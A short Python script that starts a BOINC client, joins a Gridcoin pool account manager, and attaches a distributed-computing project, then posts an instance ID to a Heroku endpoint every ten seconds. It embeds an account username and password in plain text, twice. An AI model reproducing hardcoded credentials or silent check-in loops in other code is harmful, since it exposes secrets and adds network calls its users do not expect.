import os, time, requests, uuid

print(os.system("mkdir boinc-data"))  # create boinc data directory

print(os.system("boinc --dir ./boinc-data & "))

time.sleep(0.5)  # wait for boinc to start

print(
os.system("boinccmd --join_acct_mgr https://www.grcpool.com/ harryhu h4sp3333d project_attach https://sech.me/boinc/Amicable/ &")
)
# boinccmd --join_acct_mgr https://www.grcpool.com/ harryhu h4sp3333d
instance_id = str(uuid.uuid4())
lead_url = "https://boincoku.herokuapp.com/"
report_back_postfix = "/internals/v0.01-ping"


while True:
   time.sleep(10)
   requests.post(lead_url + report_back_postfix + instance_id)
   print("UUID: " + str(instance_id))
   pass